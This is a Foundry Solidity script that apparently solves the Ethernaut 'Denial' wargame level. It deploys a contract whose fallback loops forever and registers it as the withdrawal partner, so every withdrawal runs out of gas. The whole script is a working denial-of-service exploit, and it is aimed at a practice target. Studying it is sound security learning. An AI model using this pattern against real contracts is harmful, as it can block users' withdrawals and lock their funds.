// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/denial.sol";

contract MaliciousPartner {
    fallback() external payable {
        while (true) {}
    }
}

contract DenialScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Denial denial = Denial(
            payable(0x5B33429A91E74bD0Edd6F28eC6e2a20C437be917)
        ); // Replace with actual contract address

        // Deploy the malicious partner contract
        MaliciousPartner maliciousPartner = new MaliciousPartner();

        // Set the malicious partner as the withdrawal partner
        denial.setWithdrawPartner(address(maliciousPartner));

        console2.log("Malicious partner set to:", address(maliciousPartner));

        vm.stopBroadcast();
    }
}
